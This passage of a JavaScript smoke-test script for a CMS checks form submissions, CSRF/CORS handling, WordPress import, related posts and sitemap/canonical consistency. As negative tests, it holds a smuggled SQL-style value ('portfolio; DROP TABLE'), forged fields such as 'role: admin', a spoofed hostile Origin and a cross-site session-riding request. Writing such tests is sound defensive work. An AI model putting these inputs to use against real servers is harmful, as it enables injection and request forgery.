    const library = await (await fetch(`${BASE}/api/media/get`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    const someMedia = (library?.data ?? [])[0];
    if (someMedia?.id) {
      const withPoster = await fetch(`${BASE}/api/content/smoke-event`, {
        method: 'POST', headers: authed,
        body: JSON.stringify({ title: 'With a poster', venue: venueId, poster: someMedia.id }),
      });
      if (withPoster.status === 201) ok('field kinds: a media handle that exists is accepted');
      else fail('media accept', `status ${withPoster.status}`);

      const list = await (await fetch(`${BASE}/api/content/smoke-event`)).json().catch(() => null);
      const postered = (list?.data ?? []).find((e) => e.data?.title === 'With a poster');
      if (postered?.data?.poster === someMedia.id) {
        ok('field kinds: the media field stores the ID, never a baked-in URL');
      } else fail('media stored wrong', JSON.stringify(postered?.data ?? null).slice(0, 160));
      if (typeof postered?.data?.poster_url === 'string' && postered.data.poster_url.length > 0) {
        ok('field kinds: ...and a resolved URL is added for readers');
      } else fail('media url not resolved', JSON.stringify(postered?.data ?? null).slice(0, 160));

      // The single-entity read must agree with the list read.
      const single = await (await fetch(`${BASE}/api/content/smoke-event/${postered.id}`)).json().catch(() => null);
      if (single?.data?.data?.poster_url === postered.data.poster_url) {
        ok('field kinds: one entity and the list resolve media identically');
      } else fail('media resolution disagrees', JSON.stringify(single?.data?.data ?? null).slice(0, 160));

      const badMedia = await fetch(`${BASE}/api/content/smoke-event`, {
        method: 'POST', headers: authed,
        body: JSON.stringify({ title: 'Ghost poster', venue: venueId, poster: 'not-a-real-file' }),
      });
      if (badMedia.status === 400 || badMedia.status === 422) {
        ok('field kinds: a media handle for a file that is not there is refused');
      } else fail('ghost media accepted', `status ${badMedia.status}`);
    }

    // The update path has to enforce the same rule as the create path — this
    // is the sibling gap this codebase keeps finding.
    if (opening?.id) {
      const badUpdate = await fetch(`${BASE}/api/content/smoke-event/${opening.id}`, {
        method: 'PUT', headers: authed, body: JSON.stringify({ venue: 'still-not-a-venue' }),
      });
      if (badUpdate.status === 400 || badUpdate.status === 422) {
        ok('field kinds: an UPDATE cannot introduce a dangling reference either');
      } else fail('update ref leak', `status ${badUpdate.status}`);

      // CLEARING an optional field: an explicit null empties it. Before this
      // there was no way to remove a value once set — a typo was permanent.
      const withUrl = await (await fetch(`${BASE}/api/content/smoke-event`, {
        method: 'POST', headers: authed,
        body: JSON.stringify({ title: 'Has a URL', venue: venueId, more_at: 'https://example.com' }),
      })).json().catch(() => null);
      const evId = withUrl?.data?.id;
      if (evId) {
        await fetch(`${BASE}/api/content/smoke-event/${evId}`, {
          method: 'PUT', headers: authed, body: JSON.stringify({ more_at: null }),
        });
        const cleared = await (await fetch(`${BASE}/api/content/smoke-event/${evId}`)).json().catch(() => null);
        if (cleared?.data?.data?.more_at === undefined) {
          ok('field kinds: an optional field can be CLEARED with an explicit null');
        } else fail('clear field', `more_at is still ${JSON.stringify(cleared?.data?.data?.more_at)}`);
      }
    }

    // A ref whose TARGET TYPE was deleted must be refused: its entries linger
    // unserved, so validating against them would bless a link no reader can
    // resolve. Drop the venue type, keep event, and try to point at it.
    await fetch(`${BASE}/api/content-types`, {
      method: 'PUT', headers: authed,
      body: JSON.stringify([
        // smoke-event kept, smoke-venue removed.
        {
          name: 'smoke-event', label: 'Event', visibility: 'public',
          fields: [
            { name: 'title', rule: { type: 'string', min: 1, max: 100 } },
            { name: 'venue', rule: { type: 'ref', to: 'smoke-venue' } },
          ],
        },
      ]),
    });
    const orphanRef = await fetch(`${BASE}/api/content/smoke-event`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({ title: 'Orphan', venue: venueId }),
    });
    if (orphanRef.status === 400 || orphanRef.status === 422) {
      ok('field kinds: a ref whose target TYPE was deleted is refused');
    } else fail('orphan ref accepted', `status ${orphanRef.status}`);

    await fetch(`${BASE}/api/content-types`, { method: 'PUT', headers: authed, body: '[]' });
  }

  // ---- public-write content types (the form builder) ----
  //
  // A type that declares `writable: 'public'` opens an anonymous POST endpoint
  // on the internet. What matters is not that it works — it is what it refuses:
  // a type that never asked for submissions, a submitter reading back what
  // other people sent, a field nobody declared, and a bot that fills the
  // honeypot.
  if (sessionCookie && csrfToken) {
    const authed = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    // What a real visitor's browser carries: no session, but the CSRF cookie
    // the middleware sets on any page load, echoed in the header. Anonymous
    // writes are CSRF-protected exactly like /api/contact, and a test that
    // skipped it would be testing curl rather than a form.
    const anonJson = {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
      Cookie: `astrobaas_csrf=${csrfToken}`,
    };

    const defs = [
      {
        // A form: anyone may send one, only staff may read them. The pairing
        // an enquiry or a job application needs.
        name: 'smoke-enquiry', label: 'Enquiry', labelPlural: 'Enquiries',
        visibility: 'staff', writable: 'public',
        fields: [
          { name: 'name', rule: { type: 'string', min: 1, max: 100 } },
          { name: 'message', rule: { type: 'string', min: 1, max: 500 } },
        ],
      },
      {
        // The default: readable by anyone, writable by staff.
        name: 'smoke-notice', label: 'Notice', labelPlural: 'Notices',
        visibility: 'public',
        fields: [{ name: 'title', rule: { type: 'string', min: 1, max: 100 } }],
      },
    ];
    const put = await fetch(`${BASE}/api/content-types`, {
      method: 'PUT', headers: authed, body: JSON.stringify(defs),
    });
    if (put.status === 200) ok('public forms: a writable type is accepted by the builder API');
    else fail('public forms PUT', `expected 200, got ${put.status}`);

    // The one that must work.
    const sent = await fetch(`${BASE}/api/content/smoke-enquiry`, {
      method: 'POST', headers: anonJson,
      body: JSON.stringify({ name: 'A stranger', message: 'Do you ship to Crete?' }),
    });
    const sentJson = await sent.json().catch(() => null);
    if (sent.status === 201) ok('public forms: an anonymous submission is accepted');
    else fail('public form submit', `expected 201, got ${sent.status}`);

    // ...and the one that must not. A type that never said `public` is a 404,
    // the same 404 a name that does not exist gets.
    const refused = await fetch(`${BASE}/api/content/smoke-notice`, {
      method: 'POST', headers: anonJson, body: JSON.stringify({ title: 'I should not exist' }),
    });
    if (refused.status === 404) ok('public forms: a type that did NOT ask for submissions refuses anonymous writes');
    else fail('public write leak', `staff-write type returned ${refused.status}`);

    const unknown = await fetch(`${BASE}/api/content/smoke-nothing-here`, {
      method: 'POST', headers: anonJson, body: JSON.stringify({ x: 1 }),
    });
    if (unknown.status === refused.status) {
      ok('public forms: refusing and not-existing are indistinguishable from outside');
    } else {
      fail('public form probe oracle', `refused=${refused.status} unknown=${unknown.status}`);
    }

    // The submitter learns that it arrived, and nothing else. On a form that is
    // writable-but-not-readable, echoing the record back would be the leak.
    const echoed = JSON.stringify(sentJson?.data ?? {});
    if (!/Do you ship to Crete/.test(echoed)) ok('public forms: the response does not echo the submission back');
    else fail('public form echo', `response carried the record: ${echoed.slice(0, 120)}`);

    // Nor may a submitter read what anyone else sent.
    const peek = await fetch(`${BASE}/api/content/smoke-enquiry`);
    if (peek.status === 404) ok('public forms: submissions are not readable by the public');
    else fail('submission read leak', `anonymous GET returned ${peek.status}`);

    // Staff can read them, and the entry is really there.
    const staffRead = await fetch(`${BASE}/api/content/smoke-enquiry`, { headers: { Cookie: sessionCookie } });
    const staffJson = await staffRead.json().catch(() => null);
    const entry = (staffJson?.data ?? []).find((e) => e.data?.message === 'Do you ship to Crete?');
    if (entry) ok('public forms: staff can read the submission');
    else fail('submission not stored', `staff GET returned ${staffRead.status}`);

    if (entry && typeof entry.data?.submitted_at === 'string') {
      ok('public forms: the entry is marked as having come from outside');
    } else fail('submitted_at missing', JSON.stringify(entry ?? null).slice(0, 120));

    // A honeypot that is filled looks like success and stores nothing. Telling
    // a bot it failed just teaches it which field to drop.
    const trapped = await fetch(`${BASE}/api/content/smoke-enquiry`, {
      method: 'POST', headers: anonJson,
      body: JSON.stringify({ name: 'Bot', message: 'buy pills', hp_url: 'http://spam.example' }),
    });
    const afterTrap = await (await fetch(`${BASE}/api/content/smoke-enquiry`, {
      headers: { Cookie: sessionCookie },
    })).json().catch(() => null);
    if (trapped.status === 201) ok('public forms: a filled honeypot is answered like success');
    else fail('honeypot response', `expected 201, got ${trapped.status}`);
    if (!(afterTrap?.data ?? []).some((e) => e.data?.message === 'buy pills')) {
      ok('public forms: ...and nothing is stored');
    } else fail('honeypot stored', 'the honeypot submission was saved');

    // A submitter cannot introduce a field, or forge the one the server sets.
    const extra = await fetch(`${BASE}/api/content/smoke-enquiry`, {
      method: 'POST', headers: anonJson,
      body: JSON.stringify({
        name: 'Sneaky', message: 'hello',
        id: 'chosen-by-me', submitted_at: '1999-01-01T00:00:00.000Z', role: 'admin',
      }),
    });
    const afterExtra = await (await fetch(`${BASE}/api/content/smoke-enquiry`, {
      headers: { Cookie: sessionCookie },
    })).json().catch(() => null);
    const sneaky = (afterExtra?.data ?? []).find((e) => e.data?.name === 'Sneaky');
    if (extra.status === 201 && sneaky) ok('public forms: a submission with extra keys is still accepted');
    else fail('extra-key submit', `status ${extra.status}`);
    if (sneaky && sneaky.id !== 'chosen-by-me' && sneaky.data?.id === undefined
        && sneaky.data?.role === undefined) {
      ok('public forms: fields the type never declared are dropped, not stored');
    } else fail('undeclared field stored', JSON.stringify(sneaky ?? null).slice(0, 160));
    if (sneaky && sneaky.data?.submitted_at !== '1999-01-01T00:00:00.000Z'
        && typeof sneaky?.data?.submitted_at === 'string') {
      ok('public forms: the submitted-at stamp cannot be forged by the submitter');
    } else fail('forged submitted_at', String(sneaky?.data?.submitted_at));

    // The schema is still the schema: a required field is required.
    const invalid = await fetch(`${BASE}/api/content/smoke-enquiry`, {
      method: 'POST', headers: anonJson, body: JSON.stringify({ name: 'No message' }),
    });
    if (invalid.status === 400 || invalid.status === 422) {
      ok('public forms: a submission missing a required field is refused');
    } else fail('form validation', `expected 400/422, got ${invalid.status}`);

    // Staff writes to a public-write type still work and are NOT marked as
    // submissions — the two doors stay distinguishable in the admin.
    const byStaff = await fetch(`${BASE}/api/content/smoke-enquiry`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({ name: 'Colleague', message: 'typed in the admin' }),
    });
    const afterStaff = await (await fetch(`${BASE}/api/content/smoke-enquiry`, {
      headers: { Cookie: sessionCookie },
    })).json().catch(() => null);
    const typed = (afterStaff?.data ?? []).find((e) => e.data?.name === 'Colleague');
    if (byStaff.status === 201 && typed) ok('public forms: staff can still add entries directly');
    else fail('staff write to form type', `status ${byStaff.status}`);
    if (typed && typed.data?.submitted_at === undefined) {
      ok('public forms: a staff entry is not marked as a public submission');
    } else fail('staff entry marked as submission', String(typed?.data?.submitted_at));

    // ---- ...and from a HEADLESS site: the cookie-less cross-origin door ----
    //
    // Everything above posts the way a page on THIS origin does, with the CSRF
    // cookie echoed in the header. A form on a headless storefront cannot: it
    // is on another site, so it never sees that cookie, and every submission
    // was `403 CSRF_FAILED` — measured on a live demo storefront's table
    // request form. Checkout, contact and newsletter had been exempted for
    // exactly this caller; the form builder's forms were the sibling left out.
    // Its own type, so the per-type submission limit the block above already
    // spends cannot turn a pass into a 429.
    {
      const STORE = 'https://frontend.example.com';
      const json = { 'Content-Type': 'application/json' };
      const rsvp = {
        name: 'smoke-rsvp', label: 'RSVP', visibility: 'staff', writable: 'public',
        fields: [
          { name: 'name', rule: { type: 'string', min: 1, max: 100 } },
          { name: 'guests', rule: { type: 'number', int: true, min: 1, max: 12 } },
        ],
      };
      const putRsvp = await fetch(`${BASE}/api/content-types`, {
        method: 'PUT', headers: authed, body: JSON.stringify([...defs, rsvp]),
      });
      if (putRsvp.status !== 200) fail('rsvp type PUT', `status=${putRsvp.status}`);

      // THE CASE THAT WAS BROKEN: no cookie at all, allow-listed origin.
      const fromStore = await fetch(`${BASE}/api/content/smoke-rsvp`, {
        method: 'POST', headers: { ...json, Origin: STORE },
        body: JSON.stringify({ name: 'A guest', guests: 2 }),
      });
      if (fromStore.status === 201) ok('public forms: a headless storefront can submit, cookie-less');
      else fail('cross-origin form submit', `status=${fromStore.status} ${(await fromStore.text()).slice(0, 120)}`);
      const stored = await (await fetch(`${BASE}/api/content/smoke-rsvp`, { headers: { Cookie: sessionCookie } }))
        .json().catch(() => null);
      if ((stored?.data ?? []).some((e) => e.data?.name === 'A guest')) ok('...and the submission is really stored');
      else fail('cross-origin submission not stored', JSON.stringify(stored?.data ?? null).slice(0, 120));

      // The exemption opens the DOOR, not the type: a type that never said
      // `public` still 404s for this caller, exactly as for a same-origin one.
      const notForm = await fetch(`${BASE}/api/content/smoke-notice`, {
        method: 'POST', headers: { ...json, Origin: STORE },
        body: JSON.stringify({ title: 'I should not exist' }),
      });
      if (notForm.status === 404) ok('...and a type that is not a form still refuses it');
      else fail('cross-origin write to a staff type', `status=${notForm.status}`);

      // Another site entirely. Page script cannot forge Origin.
      const evil = await fetch(`${BASE}/api/content/smoke-rsvp`, {
        method: 'POST', headers: { ...json, Origin: 'https://evil.example.com' },
        body: JSON.stringify({ name: 'Evil', guests: 1 }),
      });
      if (evil.status === 403) ok('...and a NON-allow-listed origin is still refused');
      else fail('form cors bypass', `evil origin got ${evil.status}`);
      if (!evil.headers.get('access-control-allow-origin')) ok('...without a CORS grant for that origin');
      else fail('CORS granted to a stranger', evil.headers.get('access-control-allow-origin'));

      // No Origin: a non-browser caller, which must use a key or the token.
      const bare = await fetch(`${BASE}/api/content/smoke-rsvp`, {
        method: 'POST', headers: json, body: JSON.stringify({ name: 'Curl', guests: 1 }),
      });
      if (bare.status === 403) ok('...and a request with no Origin still needs the token');
      else fail('originless form bypass', `got ${bare.status}`);

      // THE ATTACK: a request carrying a SESSION keeps the full CSRF check.
      const ridden = await fetch(`${BASE}/api/content/smoke-rsvp`, {
        method: 'POST', headers: { ...json, Origin: STORE, Cookie: sessionCookie },
        body: JSON.stringify({ name: 'Ridden', guests: 1 }),
      });
      const riddenJson = await ridden.json().catch(() => null);
      if (ridden.status === 403 && riddenJson?.error?.code === 'CSRF_FAILED') {
        ok('...and a SESSION-carrying request is still CSRF-checked');
      } else fail('csrf bypassed for a session on a form', `got ${ridden.status}`);

      // ---- a refusal must be READABLE by the storefront that caused it ----
      //
      // Without Access-Control-Allow-Origin the browser hides the status and
      // the body and reports "blocked by CORS policy", so every one of these
      // looked like a CORS misconfiguration from the storefront's side.
      if (ridden.headers.get('access-control-allow-origin') === STORE) {
        ok('a CSRF refusal to an allow-listed origin carries CORS, so the storefront can read it');
      } else fail('CSRF 403 unreadable cross-origin', `ACAO=${ridden.headers.get('access-control-allow-origin')}`);

      const unauth = await fetch(`${BASE}/api/products`, {
        method: 'POST', headers: { ...json, Origin: STORE },
        body: JSON.stringify({ name: 'Injected', slug: 'injected-cors', price_cents: 1 }),
      });
      if ((unauth.status === 401 || unauth.status === 403)
          && unauth.headers.get('access-control-allow-origin') === STORE) {
        ok('...and so does a 401 for a staff-only write');
      } else fail('401 unreadable cross-origin', `status=${unauth.status} ACAO=${unauth.headers.get('access-control-allow-origin')}`);

      const huge = await fetch(`${BASE}/api/content/smoke-rsvp`, {
        method: 'POST', headers: { ...json, Origin: STORE },
        body: JSON.stringify({ name: 'x'.repeat(2 * 1024 * 1024 + 10), guests: 1 }),
      });
      if (huge.status === 413 && huge.headers.get('access-control-allow-origin') === STORE) {
        ok('...and so does a 413 for an oversized body');
      } else fail('413 unreadable cross-origin', `status=${huge.status} ACAO=${huge.headers.get('access-control-allow-origin')}`);
    }

    await fetch(`${BASE}/api/content-types`, { method: 'PUT', headers: authed, body: '[]' });
  }

  // ---- WordPress import ----
  //
  // The parser, the planner and the writer are covered by their own unit
  // tests, on all three drivers. What can only be checked against a running
  // server is the DOOR: who may push a file through it, whether the default
  // really is a rehearsal, and whether the middleware's body ceiling lets a
  // real export reach the route at all.
  {
    const wxr = `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wp="http://wordpress.org/export/1.2/">
<channel><title>Smoke Import</title><wp:base_site_url>https://smoke-import.example</wp:base_site_url>
<item><title>Imported by smoke</title><link>https://smoke-import.example/2021/09/smoke-import/</link>
<wp:post_id>5001</wp:post_id><wp:post_name>smoke-import-post</wp:post_name>
<wp:post_type>post</wp:post_type><wp:status>publish</wp:status>
<content:encoded><![CDATA[<p>Imported body.</p>]]></content:encoded></item>
</channel></rss>`;

    const upload = (extra = {}, headers = {}) => {
      const fd = new FormData();
      fd.set('file', new Blob([wxr], { type: 'text/xml' }), 'export.xml');
      for (const [k, v] of Object.entries(extra)) fd.set(k, v);
      return fetch(`${BASE}/api/import/wordpress`, { method: 'POST', headers, body: fd });
    };

    const anon = await upload();
    if (anon.status === 401 || anon.status === 403) ok('import: anonymous callers are refused');
    else fail('import auth leak', `anonymous POST returned ${anon.status}`);

    if (sessionCookie && csrfToken) {
      const authHeaders = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'X-CSRF-Token': csrfToken,
      };

      // The default has to be the safe one, so send NO dry_run field at all.
      const rehearsal = await upload({}, authHeaders);
      const rj = await rehearsal.json().catch(() => null);
      if (rehearsal.status === 200 && rj?.data?.dryRun === true) {
        ok('import: with no dry_run field, the default is a rehearsal');
      } else {
        fail('import default', `status ${rehearsal.status}, dryRun=${rj?.data?.dryRun}`);
      }

      if (rj?.data?.createdPosts === 1) ok('import: the rehearsal reports the post it would create');
      else fail('import rehearsal count', `createdPosts=${rj?.data?.createdPosts}`);

      // ...and it must not have written it.
      const afterDry = await fetch(`${BASE}/api/posts/smoke-import-post`);
      if (afterDry.status === 404) ok('import: a rehearsal writes nothing');
      else fail('import rehearsal wrote', `GET returned ${afterDry.status}`);

      const real = await upload({ dry_run: 'false' }, authHeaders);
      const realJson = await real.json().catch(() => null);
      if (real.status === 200 && realJson?.data?.createdPosts === 1) {
        ok('import: dry_run=false actually imports');
      } else {
        fail('import apply', `status ${real.status}, created=${realJson?.data?.createdPosts}`);
      }

      const live = await fetch(`${BASE}/api/posts/smoke-import-post`);
      if (live.status === 200) ok('import: the imported post is served by the API');
      else fail('import not readable', `GET returned ${live.status}`);

      // The old permalink must keep working — that is the entire point.
      const legacy = await fetch(`${BASE}/2021/09/smoke-import`, { redirect: 'manual' });
      if (legacy.status === 301 && (legacy.headers.get('location') ?? '').endsWith('/blog/smoke-import-post')) {
        ok('import: the old WordPress URL now 301s to the new one');
      } else {
        fail('import redirect', `status ${legacy.status} → ${legacy.headers.get('location')}`);
      }

      // Re-running is the thing operators actually do.
      const again = await upload({ dry_run: 'false' }, authHeaders);
      const againJson = await again.json().catch(() => null);
      if (againJson?.data?.createdPosts === 0) ok('import: a second run creates nothing');
      else fail('import idempotency', `second run created ${againJson?.data?.createdPosts}`);

      // A file that is not an export gets a sentence, not a stack trace.
      const notAnExport = new FormData();
      notAnExport.set('file', new Blob(['just some text'], { type: 'text/xml' }), 'notes.txt');
      const bad = await fetch(`${BASE}/api/import/wordpress`, {
        method: 'POST', headers: authHeaders, body: notAnExport,
      });
      const badJson = await bad.json().catch(() => null);
      const msg = badJson?.error?.message ?? badJson?.message ?? '';
      if (bad.status === 400 && /WordPress export/i.test(msg)) {
        ok('import: a file that is not an export is refused by name');
      } else {
        fail('import bad file', `status ${bad.status}, message ${JSON.stringify(msg)}`);
      }

      // And the custom-post-type field only takes post-type names.
      const hostile = await upload({ extra_types: 'portfolio; DROP TABLE', dry_run: 'true' }, authHeaders);
      if (hostile.status === 400) ok('import: a malformed post-type name is rejected, not sanitized');
      else fail('import extra_types', `expected 400, got ${hostile.status}`);
    }
  }

  // ---- Related posts are actually RENDERED ----
  //
  // lib/related.ts shipped with 34 passing assertions and ZERO call sites: no
  // page, no API, no theme slot rendered it. A pure module nothing calls is not
  // a feature, and unit tests cannot tell the difference.
  if (sessionCookie && csrfToken) {
    const mk = async (title, slug, cat) => fetch(`${BASE}/api/posts`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      },
      body: JSON.stringify({
        title, slug, content: '<p>body</p>', status: 'published', category_id: cat,
      }),
    }).then((r) => r.json()).catch(() => null);

    const catId = 'rel-cat';
    await mk('Related One', `rel-one-${Date.now()}`, catId);
    const second = await mk('Related Two', `rel-two-${Date.now()}`, catId);
    const slug2 = second?.data?.slug;

    if (slug2) {
      const html = await fetch(`${BASE}/blog/${slug2}`).then((r) => r.text()).catch(() => '');
      if (/id="related-heading"/.test(html)) {
        ok('related posts: the strip is rendered on an article page');
      } else {
        fail('related posts', 'lib/related.ts is not reachable from any page');
      }
      if (html.includes('Related One')) ok('...and it names the post that shares a category');
      else fail('related posts content', 'the related article is not listed');
    } else {
      fail('related posts setup', 'could not create the fixture posts');
    }

    // An article with nothing in common must render NO strip rather than an
    // empty heading — the module returns nothing, and the page must respect it.
    const lonely = await mk('Lonely', `lonely-${Date.now()}`, 'no-such-cat');
    if (lonely?.data?.slug) {
      const html = await fetch(`${BASE}/blog/${lonely.data.slug}`).then((r) => r.text()).catch(() => '');
      if (!/id="related-heading"/.test(html)) ok('...and no strip at all when nothing is related');
      else fail('related posts empty', 'an empty "Related articles" heading was rendered');
    }

    // --- the same thing, for a front end this CMS does not render (C-147) ---
    //
    // The block above proves the SSR blog gets the strip. That is the half the
    // owner does not ship: both live shops are headless Next.js storefronts, so
    // an SSR-only feature does not exist for the readers who matter. There was
    // no `related` anywhere under src/pages/api, none in the client package and
    // none in the OpenAPI document, so a storefront author would have concluded
    // the feature did not exist rather than that it was unreachable.
    if (slug2) {
      const api = await fetch(`${BASE}/api/posts/${slug2}/related`);
      const aj = await api.json().catch(() => null);
      const rows = Array.isArray(aj?.data) ? aj.data : null;

      if (api.status === 200 && rows) ok('related posts: the API answers a headless caller');
      else fail('related API', `status=${api.status} body=${JSON.stringify(aj)?.slice(0, 140)}`);

      if (rows?.some((r) => r.title === 'Related One')) {
        ok('...with the post that shares a category');
      } else fail('related API content', JSON.stringify(rows)?.slice(0, 160));

      // A summary, not a whole post: three sanitizer passes to build a list of
      // links is waste, and the strip needs none of it.
      if (rows?.length && !('content_rendered' in rows[0]) && !('content' in rows[0])) {
        ok('...as a summary, without rendered bodies');
      } else fail('related API shape', Object.keys(rows?.[0] ?? {}).join(','));

      // The limit must come from the SAME resolver the blog uses, and 0 must
      // mean none rather than "use the default".
      const none = await fetch(`${BASE}/api/posts/${slug2}/related?limit=0`);
      const nj = await none.json().catch(() => null);
      if (Array.isArray(nj?.data) && nj.data.length === 0) ok('...and limit=0 really means none');
      else fail('related API limit=0', JSON.stringify(nj?.data)?.slice(0, 120));

      // THE negative case: nothing in common must return an empty list, never a
      // "latest posts" fallback dressed up as a recommendation.
      if (lonely?.data?.slug) {
        const empty = await fetch(`${BASE}/api/posts/${lonely.data.slug}/related`);
        const ej = await empty.json().catch(() => null);
        if (empty.status === 200 && Array.isArray(ej?.data) && ej.data.length === 0) {
          ok('...and an unrelated article gets an EMPTY list, not "latest"');
        } else fail('related API fallback', `status=${empty.status} n=${ej?.data?.length}`);
      }

      // Unknown post: 404, same as the sibling GET.
      const missing = await fetch(`${BASE}/api/posts/no-such-post-at-all/related`);
      if (missing.status === 404) ok('...and an unknown post is a 404');
      else fail('related API 404', `status=${missing.status}`);
    }
  }

  // ---- Sitemap and RSS name the SAME URL hreflang does ----
  //
  // Neither file contained the word "locale". Every entry was emitted at the
  // unprefixed path regardless of the record's language, so on a bilingual site
  // the sitemap submitted /blog/x while the page itself declared /de/blog/x via
  // hreflang — two different addresses for one document, and neither signal
  // usable. The smoke server runs SITE_LOCALES=en,de,el, so this is testable.
  {
    const sitemap = await fetch(`${BASE}/sitemap.xml`).then((r) => r.text()).catch(() => '');
    const rss = await fetch(`${BASE}/rss.xml`).then((r) => r.text()).catch(() => '');

    if (sitemap.includes('<urlset')) ok('sitemap: served');
    else fail('sitemap', 'not served');

    // The blog INDEX is listed per locale, because its contents differ.
    const hasPrefixedBlog = /<loc>[^<]*\/de\/blog<\/loc>/.test(sitemap);
    if (hasPrefixedBlog) ok('sitemap: lists the blog index under each configured locale');
    else fail('sitemap locales', 'no /de/blog entry for a multilingual install');

    // ...and the built-in pages are NOT, because /de/about and /about render
    // the same document. Advertising both asks a crawler to pick between two
    // addresses for one thing.
    if (!/<loc>[^<]*\/de\/about<\/loc>/.test(sitemap)) {
      ok('sitemap: does NOT duplicate a static page per locale');
    } else {
      fail('sitemap duplicates', '/de/about is listed alongside /about');
    }

    // No entry may be a bare unprefixed path for a record that is not in the
    // default locale. Checked structurally: every loc must parse.
    const locs = [...sitemap.matchAll(/<loc>([^<]+)<\/loc>/g)].map((m) => m[1]);
    if (locs.length > 0 && locs.every((l) => /^https?:\/\//.test(l))) {
      ok('sitemap: every entry is an absolute URL');
    } else {
      fail('sitemap entries', `found ${locs.length} locs, some not absolute`);
    }
    if (new Set(locs).size === locs.length) ok('sitemap: no duplicate entries');
    else fail('sitemap duplicates', 'the same URL is listed twice');

    // THE PROPERTY THAT MATTERS, and the one the first attempt at this lacked:
    // canonical, hreflang and the sitemap must name the SAME URL for one
    // document. Two of the three agreeing is what made the first version worse
    // than no change — it advertised URLs the pages themselves disowned.
    {
      const page = await fetch(`${BASE}/de/blog`, { redirect: 'manual' })
        .then((r) => (r.status === 200 ? r.text() : '')).catch(() => '');
      if (page) {
        const canon = page.match(/<link[^>]+rel="canonical"[^>]+href="([^"]+)"/);
        if (canon && canon[1].includes('/de/blog')) {
          ok('a locale-prefixed page declares a PREFIXED canonical');
        } else {
          fail('canonical', `served at /de/blog but canonical is ${canon ? canon[1] : 'absent'}`);
        }
        // And the sitemap must list that same address.
        if (canon && sitemap.includes(`<loc>${canon[1]}</loc>`)) {
          ok('...and the sitemap lists exactly that URL');
        } else {
          fail('sitemap vs canonical', `canonical ${canon ? canon[1] : '?'} is not in the sitemap`);
        }
      } else {
        fail('locale page', '/de/blog did not render');
      }

      // The JSON-LD in the SAME document must name the same URL. The canonical
      // was localised and the CollectionPage entity URL was not, so one page
      // declared two different addresses for itself.
      {
        const canon2 = page.match(/<link[^>]+rel="canonical"[^>]+href="([^"]+)"/);
        const ld = [...page.matchAll(/<script[^>]+application\/ld\+json[^>]*>([\s\S]*?)<\/script>/g)]
          .map((m) => m[1]).join(' ');
        if (canon2 && ld.includes(canon2[1])) {
          ok('...and the JSON-LD entity URL matches the canonical exactly');
        } else {
          fail('canonical vs JSON-LD', `canonical ${canon2 ? canon2[1] : '?'} is not in the structured data`);
        }
        // And no double prefix — /de/de/blog is what wrapping twice produces.
        if (!/\/(de|el)\/(de|el)\//.test(page)) ok('...with no doubled locale prefix anywhere');
        else fail('double prefix', 'a URL carries its locale twice');
      }

      // THE TWO DOCUMENTS THE CHECK ABOVE NEVER COVERED.
      //
      // /de/blog is an ARCHIVE, and the archive route already passed a
      // localized path to its CollectionPage node — so the assertion passed
      // while the POST PERMALINK and the CMS PAGE both handed their
      // schema.org node the bare unprefixed path. A German article therefore
      // declared canonical=/de/blog/<slug> and mainEntityOfPage=/blog/<slug>,
      // two live 200s serving the same article: a duplicate signal the page
      // creates about itself. One passing sibling hid two failing ones.
      if (sessionCookie && csrfToken) {
        const h = {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
          Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        };
        const stamp = Date.now().toString(36);
        const dePost = await fetch(`${BASE}/api/posts`, {
          method: 'POST', headers: h,
          body: JSON.stringify({
            title: 'Hallo Welt', slug: `hallo-${stamp}`, content: '<p>Guten Tag</p>',
            status: 'published', locale: 'de',
          }),
        }).then((r) => r.json()).catch(() => null);

        const selfConsistent = async (label, url) => {
          const html = await fetch(url).then((r) => (r.status === 200 ? r.text() : '')).catch(() => '');
          if (!html) { fail(`${label}: not served`, url); return; }
          const c = html.match(/<link[^>]+rel="canonical"[^>]+href="([^"]+)"/);
          const ld = [...html.matchAll(/<script[^>]+application\/ld\+json[^>]*>([\s\S]*?)<\/script>/g)]
            .map((m) => m[1]).join(' ');
          if (!c) { fail(`${label}: no canonical`, url); return; }
          if (ld.includes(c[1])) ok(`${label}: the JSON-LD names the same URL as the canonical`);
          else fail(`${label}: two self-addresses`, `canonical ${c[1]} is absent from its own structured data`);
        };

        if (dePost?.data?.slug) {
          await selfConsistent('a locale-prefixed POST', `${BASE}/de/blog/${dePost.data.slug}`);
        } else {
          fail('de post fixture', JSON.stringify(dePost)?.slice(0, 140));
        }

        // A Page is a post with kind:'page' — there is no /api/pages.
        const dePage = await fetch(`${BASE}/api/posts`, {
          method: 'POST', headers: h,
          body: JSON.stringify({
            title: 'Impressum', slug: `impressum-${stamp}`, content: '<p>Angaben</p>',
            status: 'published', kind: 'page', locale: 'de',
          }),
        }).then((r) => r.json()).catch(() => null);
        if (dePage?.data?.slug) {
          await selfConsistent('a locale-prefixed PAGE', `${BASE}/de/${dePage.data.slug}`);
        } else {
          fail('de page fixture', JSON.stringify(dePage)?.slice(0, 140));
        }
      }

      // A page with no prefix keeps its unprefixed canonical.
      const plain = await fetch(`${BASE}/blog`).then((r) => r.text()).catch(() => '');
      const pc = plain.match(/<link[^>]+rel="canonical"[^>]+href="([^"]+)"/);
      if (pc && !/\/(de|el)\//.test(pc[1])) ok('an unprefixed page keeps an unprefixed canonical');
      else fail('canonical default locale', `got ${pc ? pc[1] : 'none'}`);
    }

    if (rss.includes('<rss')) ok('rss: served');
    else fail('rss', 'not served');
    const guids = [...rss.matchAll(/<guid[^>]*>([^<]+)<\/guid>/g)].map((m) => m[1]);
    if (guids.every((g) => /^https?:\/\//.test(g))) ok('rss: every guid is an absolute permalink');
    else fail('rss guids', 'a guid is not an absolute URL');
  }

  // ---- Newsletter double opt-in ----
  //
  // The endpoint used to call createSubscriber directly and answer 201
